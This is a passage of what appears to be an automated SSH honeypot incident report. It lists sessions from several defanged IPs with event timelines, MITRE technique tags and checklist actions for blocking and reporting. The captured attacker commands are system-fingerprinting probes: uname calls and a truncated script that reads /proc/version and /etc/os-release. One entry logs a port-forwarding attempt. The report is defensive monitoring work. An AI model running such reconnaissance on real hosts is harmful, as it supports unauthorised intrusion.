| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:55:59` | `cowrie.session.connect` |
| `2026-08-11 13:55:59` | `cowrie.client.version` |
| `2026-08-11 13:55:59` | `cowrie.client.kex` |
| `2026-08-11 13:56:01` | `cowrie.login.success` |
| `2026-08-11 13:56:01` | `cowrie.session.params` |
| `2026-08-11 13:56:01` | `cowrie.command.input` |
| `2026-08-11 13:56:01` | `cowrie.command.input` |
| `2026-08-11 13:56:01` | `cowrie.command.input` |
| `2026-08-11 13:56:01` | `cowrie.command.input` |
| `2026-08-11 13:56:01` | `cowrie.command.input` |
| `2026-08-11 13:56:01` | `cowrie.command.success` |
| `2026-08-11 13:56:01` | `cowrie.command.input` |
| `2026-08-11 13:56:01` | `cowrie.command.input` |
| `2026-08-11 13:56:01` | `cowrie.command.input` |
| `2026-08-11 13:56:01` | `cowrie.command.input` |
| `2026-08-11 13:56:02` | `cowrie.log.closed` |
| `2026-08-11 13:56:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb3dc722c787

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 13:56 |
| **Last Seen** | 2026-08-11 13:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:56:11` | `cowrie.session.connect` |
| `2026-08-11 13:56:11` | `cowrie.client.version` |
| `2026-08-11 13:56:11` | `cowrie.client.kex` |
| `2026-08-11 13:56:12` | `cowrie.login.success` |
| `2026-08-11 13:56:13` | `cowrie.session.params` |
| `2026-08-11 13:56:13` | `cowrie.command.input` |
| `2026-08-11 13:56:13` | `cowrie.log.closed` |
| `2026-08-11 13:56:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc8b8e046375

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:57 |
| **Last Seen** | 2026-08-11 13:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:57:45` | `cowrie.session.connect` |
| `2026-08-11 13:57:45` | `cowrie.client.version` |
| `2026-08-11 13:57:45` | `cowrie.client.kex` |
| `2026-08-11 13:57:47` | `cowrie.login.success` |
| `2026-08-11 13:57:48` | `cowrie.session.params` |
| `2026-08-11 13:57:48` | `cowrie.command.input` |
| `2026-08-11 13:57:48` | `cowrie.command.input` |
| `2026-08-11 13:57:48` | `cowrie.command.input` |
| `2026-08-11 13:57:48` | `cowrie.command.input` |
| `2026-08-11 13:57:48` | `cowrie.command.input` |
| `2026-08-11 13:57:48` | `cowrie.command.success` |
| `2026-08-11 13:57:48` | `cowrie.command.input` |
| `2026-08-11 13:57:48` | `cowrie.command.input` |
| `2026-08-11 13:57:48` | `cowrie.command.input` |
| `2026-08-11 13:57:48` | `cowrie.command.input` |
| `2026-08-11 13:57:49` | `cowrie.log.closed` |
| `2026-08-11 13:57:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb2a7622483e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 13:57 |
| **Last Seen** | 2026-08-11 13:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:57:50` | `cowrie.session.connect` |
| `2026-08-11 13:57:50` | `cowrie.client.version` |
| `2026-08-11 13:57:50` | `cowrie.client.kex` |
| `2026-08-11 13:57:50` | `cowrie.login.success` |
| `2026-08-11 13:57:51` | `cowrie.session.params` |
| `2026-08-11 13:57:51` | `cowrie.command.input` |
| `2026-08-11 13:57:51` | `cowrie.log.closed` |
| `2026-08-11 13:57:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bec90c36431

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 13:58 |
| **Last Seen** | 2026-08-11 13:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:58:36` | `cowrie.session.connect` |
| `2026-08-11 13:58:36` | `cowrie.client.version` |
| `2026-08-11 13:58:36` | `cowrie.client.kex` |
| `2026-08-11 13:58:36` | `cowrie.login.success` |
| `2026-08-11 13:58:37` | `cowrie.session.params` |
| `2026-08-11 13:58:37` | `cowrie.command.input` |
| `2026-08-11 13:58:37` | `cowrie.log.closed` |
| `2026-08-11 13:58:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55c31d4fa7b2

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 13:59 |
| **Last Seen** | 2026-08-11 13:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:59:29` | `cowrie.session.connect` |
| `2026-08-11 13:59:29` | `cowrie.client.version` |
| `2026-08-11 13:59:29` | `cowrie.client.kex` |
| `2026-08-11 13:59:30` | `cowrie.login.success` |
| `2026-08-11 13:59:31` | `cowrie.session.params` |
| `2026-08-11 13:59:31` | `cowrie.command.input` |
| `2026-08-11 13:59:31` | `cowrie.log.closed` |
| `2026-08-11 13:59:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c1a8e511574

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:59 |
| **Last Seen** | 2026-08-11 13:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:59:33` | `cowrie.session.connect` |
| `2026-08-11 13:59:33` | `cowrie.client.version` |
| `2026-08-11 13:59:33` | `cowrie.client.kex` |
| `2026-08-11 13:59:35` | `cowrie.login.success` |
| `2026-08-11 13:59:35` | `cowrie.session.params` |
| `2026-08-11 13:59:35` | `cowrie.command.input` |
| `2026-08-11 13:59:35` | `cowrie.command.input` |
| `2026-08-11 13:59:35` | `cowrie.command.input` |
| `2026-08-11 13:59:35` | `cowrie.command.input` |
| `2026-08-11 13:59:35` | `cowrie.command.input` |
| `2026-08-11 13:59:35` | `cowrie.command.success` |
| `2026-08-11 13:59:35` | `cowrie.command.input` |
| `2026-08-11 13:59:35` | `cowrie.command.input` |
| `2026-08-11 13:59:35` | `cowrie.command.input` |
| `2026-08-11 13:59:35` | `cowrie.command.input` |
| `2026-08-11 13:59:36` | `cowrie.log.closed` |
| `2026-08-11 13:59:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56e4d62e16ed

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 14:01 |
| **Last Seen** | 2026-08-11 14:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:01:06` | `cowrie.session.connect` |
| `2026-08-11 14:01:06` | `cowrie.client.version` |
| `2026-08-11 14:01:06` | `cowrie.client.kex` |
| `2026-08-11 14:01:07` | `cowrie.login.success` |
| `2026-08-11 14:01:08` | `cowrie.session.params` |
| `2026-08-11 14:01:08` | `cowrie.command.input` |
| `2026-08-11 14:01:08` | `cowrie.log.closed` |
| `2026-08-11 14:01:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9746c1fc1e1c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 14:01 |
| **Last Seen** | 2026-08-11 14:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:01:21` | `cowrie.session.connect` |
| `2026-08-11 14:01:22` | `cowrie.client.version` |
| `2026-08-11 14:01:22` | `cowrie.client.kex` |
| `2026-08-11 14:01:23` | `cowrie.login.success` |
| `2026-08-11 14:01:25` | `cowrie.session.params` |
| `2026-08-11 14:01:25` | `cowrie.command.input` |
| `2026-08-11 14:01:25` | `cowrie.command.input` |
| `2026-08-11 14:01:25` | `cowrie.command.input` |
| `2026-08-11 14:01:25` | `cowrie.command.input` |
| `2026-08-11 14:01:25` | `cowrie.command.input` |
| `2026-08-11 14:01:25` | `cowrie.command.success` |
| `2026-08-11 14:01:25` | `cowrie.command.input` |
| `2026-08-11 14:01:25` | `cowrie.command.input` |
| `2026-08-11 14:01:25` | `cowrie.command.input` |
| `2026-08-11 14:01:25` | `cowrie.command.input` |
| `2026-08-11 14:01:25` | `cowrie.log.closed` |
| `2026-08-11 14:01:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02fc45cc34d1

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 14:01 |
| **Last Seen** | 2026-08-11 14:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:01:24` | `cowrie.session.connect` |
| `2026-08-11 14:01:24` | `cowrie.client.version` |
| `2026-08-11 14:01:25` | `cowrie.client.kex` |
| `2026-08-11 14:01:25` | `cowrie.login.success` |
| `2026-08-11 14:01:26` | `cowrie.session.params` |
| `2026-08-11 14:01:26` | `cowrie.command.input` |
| `2026-08-11 14:01:26` | `cowrie.log.closed` |
| `2026-08-11 14:01:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffbd835577c4

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 14:02 |
| **Last Seen** | 2026-08-11 14:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:02:40` | `cowrie.session.connect` |
| `2026-08-11 14:02:40` | `cowrie.client.version` |
| `2026-08-11 14:02:40` | `cowrie.client.kex` |
| `2026-08-11 14:02:40` | `cowrie.login.success` |
| `2026-08-11 14:02:41` | `cowrie.session.params` |
| `2026-08-11 14:02:41` | `cowrie.command.input` |
| `2026-08-11 14:02:41` | `cowrie.log.closed` |
| `2026-08-11 14:02:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ba9d42d714e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 14:03 |
| **Last Seen** | 2026-08-11 14:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:03:06` | `cowrie.session.connect` |
| `2026-08-11 14:03:07` | `cowrie.client.version` |
| `2026-08-11 14:03:07` | `cowrie.client.kex` |
| `2026-08-11 14:03:08` | `cowrie.login.success` |
| `2026-08-11 14:03:09` | `cowrie.session.params` |
| `2026-08-11 14:03:09` | `cowrie.command.input` |
| `2026-08-11 14:03:09` | `cowrie.command.input` |
| `2026-08-11 14:03:09` | `cowrie.command.input` |
| `2026-08-11 14:03:09` | `cowrie.command.input` |
| `2026-08-11 14:03:09` | `cowrie.command.input` |
| `2026-08-11 14:03:09` | `cowrie.command.success` |
| `2026-08-11 14:03:09` | `cowrie.command.input` |
| `2026-08-11 14:03:09` | `cowrie.command.input` |
| `2026-08-11 14:03:09` | `cowrie.command.input` |
| `2026-08-11 14:03:09` | `cowrie.command.input` |
| `2026-08-11 14:03:10` | `cowrie.log.closed` |
| `2026-08-11 14:03:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b437e16616c7

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 14:04 |
| **Last Seen** | 2026-08-11 14:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:04:05` | `cowrie.session.connect` |
| `2026-08-11 14:04:05` | `cowrie.client.version` |
| `2026-08-11 14:04:05` | `cowrie.client.kex` |
| `2026-08-11 14:04:05` | `cowrie.login.success` |
| `2026-08-11 14:04:06` | `cowrie.session.params` |
| `2026-08-11 14:04:06` | `cowrie.command.input` |
| `2026-08-11 14:04:06` | `cowrie.log.closed` |
| `2026-08-11 14:04:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-253f2c795c45

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 14:04 |
| **Last Seen** | 2026-08-11 14:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:04:16` | `cowrie.session.connect` |
| `2026-08-11 14:04:16` | `cowrie.client.version` |
| `2026-08-11 14:04:16` | `cowrie.client.kex` |
| `2026-08-11 14:04:16` | `cowrie.login.success` |
| `2026-08-11 14:04:17` | `cowrie.session.params` |
| `2026-08-11 14:04:17` | `cowrie.command.input` |
| `2026-08-11 14:04:17` | `cowrie.log.closed` |
| `2026-08-11 14:04:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d1d16904005

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 14:04 |
| **Last Seen** | 2026-08-11 14:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:04:51` | `cowrie.session.connect` |
| `2026-08-11 14:04:51` | `cowrie.client.version` |
| `2026-08-11 14:04:51` | `cowrie.client.kex` |
| `2026-08-11 14:04:53` | `cowrie.login.success` |
| `2026-08-11 14:04:54` | `cowrie.session.params` |
| `2026-08-11 14:04:54` | `cowrie.command.input` |
| `2026-08-11 14:04:54` | `cowrie.command.input` |
| `2026-08-11 14:04:54` | `cowrie.command.input` |
| `2026-08-11 14:04:54` | `cowrie.command.input` |
| `2026-08-11 14:04:54` | `cowrie.command.input` |
| `2026-08-11 14:04:54` | `cowrie.command.success` |
| `2026-08-11 14:04:54` | `cowrie.command.input` |
| `2026-08-11 14:04:54` | `cowrie.command.input` |
| `2026-08-11 14:04:54` | `cowrie.command.input` |
| `2026-08-11 14:04:54` | `cowrie.command.input` |
| `2026-08-11 14:04:54` | `cowrie.log.closed` |
| `2026-08-11 14:04:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-681dfe6edd23

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 14:05 |
| **Last Seen** | 2026-08-11 14:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:05:55` | `cowrie.session.connect` |
| `2026-08-11 14:05:55` | `cowrie.client.version` |
| `2026-08-11 14:05:55` | `cowrie.client.kex` |
| `2026-08-11 14:05:55` | `cowrie.login.success` |
| `2026-08-11 14:05:56` | `cowrie.session.params` |
| `2026-08-11 14:05:56` | `cowrie.command.input` |
| `2026-08-11 14:05:56` | `cowrie.log.closed` |
| `2026-08-11 14:05:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b849d02ddfb6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 14:06 |
| **Last Seen** | 2026-08-11 14:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:06:36` | `cowrie.session.connect` |
| `2026-08-11 14:06:37` | `cowrie.client.version` |
| `2026-08-11 14:06:37` | `cowrie.client.kex` |
| `2026-08-11 14:06:38` | `cowrie.login.success` |
| `2026-08-11 14:06:40` | `cowrie.session.params` |
| `2026-08-11 14:06:40` | `cowrie.command.input` |
| `2026-08-11 14:06:40` | `cowrie.command.input` |
| `2026-08-11 14:06:40` | `cowrie.command.input` |
| `2026-08-11 14:06:40` | `cowrie.command.input` |
| `2026-08-11 14:06:40` | `cowrie.command.input` |
| `2026-08-11 14:06:40` | `cowrie.command.success` |
| `2026-08-11 14:06:40` | `cowrie.command.input` |
| `2026-08-11 14:06:40` | `cowrie.command.input` |
| `2026-08-11 14:06:40` | `cowrie.command.input` |
| `2026-08-11 14:06:40` | `cowrie.command.input` |
| `2026-08-11 14:06:40` | `cowrie.log.closed` |
| `2026-08-11 14:06:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff4e51c56dae

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 14:06 |
| **Last Seen** | 2026-08-11 14:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:06:48` | `cowrie.session.connect` |
| `2026-08-11 14:06:48` | `cowrie.client.version` |
| `2026-08-11 14:06:48` | `cowrie.client.kex` |
| `2026-08-11 14:06:48` | `cowrie.login.success` |
| `2026-08-11 14:06:49` | `cowrie.session.params` |
| `2026-08-11 14:06:49` | `cowrie.command.input` |
| `2026-08-11 14:06:49` | `cowrie.log.closed` |
| `2026-08-11 14:06:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de302c9592f5

| Field | Detail |
|---|---|
| **Source IP** | `103.251.143[.]14` |
| **First Seen** | 2026-08-11 14:07 |
| **Last Seen** | 2026-08-11 14:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:07:06` | `cowrie.session.connect` |
| `2026-08-11 14:07:06` | `cowrie.client.version` |
| `2026-08-11 14:07:06` | `cowrie.client.kex` |
| `2026-08-11 14:07:08` | `cowrie.login.success` |
| `2026-08-11 14:07:09` | `cowrie.direct-tcpip.request` |
| `2026-08-11 14:07:13` | `cowrie.session.closed` |

**Recommended Actions:**
